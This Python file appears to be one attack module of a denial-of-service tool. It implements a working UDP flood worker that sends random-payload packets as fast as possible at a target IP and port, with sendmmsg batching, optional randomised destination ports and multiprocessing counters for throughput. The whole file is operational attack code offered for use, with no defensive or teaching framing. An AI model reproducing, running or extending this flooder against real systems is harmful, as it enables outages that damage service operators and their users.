"""
Method 1 — UDP Flood
Raw UDP packets sent as fast as possible.
Uses sendmmsg batching when available for higher throughput.
"""

import socket
import random
import time

import config
from methods.base import WorkerArgs


def worker(args: WorkerArgs):
    """
    Worker entry point — runs inside a multiprocessing.Process.
    Sends UDP packets until duration expires or the process is terminated.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        sock.setsockopt(socket.SOL_SOCKET, config.SO_REUSEPORT, 1)
    except OSError:
        pass  # kernel too old or unsupported

    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, config.SEND_BUFFER)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 0)

    payload    = bytearray(random.getrandbits(8) for _ in range(args.packet_size))
    addr_fixed = (args.target_ip, args.target_port) if not args.use_random_ports else None
    end_time   = time.time() + args.duration
    local_count = 0
    batch_size  = 50

    if config.USE_SENDMMSG and not args.use_random_ports:
        # Fast path: batch syscall
        batch = [(payload, addr_fixed) for _ in range(batch_size)]
        while time.time() < end_time:
            try:
                sent = sock.sendmmsg(batch)
                local_count += sent
            except Exception:
                # Fall back to single sends if sendmmsg fails
                for _ in range(batch_size):
                    try:
                        sock.sendto(payload, addr_fixed)
                        local_count += 1
                    except Exception:
                        pass
    else:
        # Standard path
        while time.time() < end_time:
            addr = (
                (args.target_ip, random.randint(1, 65535))
                if args.use_random_ports
                else addr_fixed
            )
            try:
                sock.sendto(payload, addr)
                local_count += 1
            except Exception:
                pass

    # Flush counter back to shared memory
    with args.counter_lock:
        args.packets_sent.value += local_count

    sock.close()
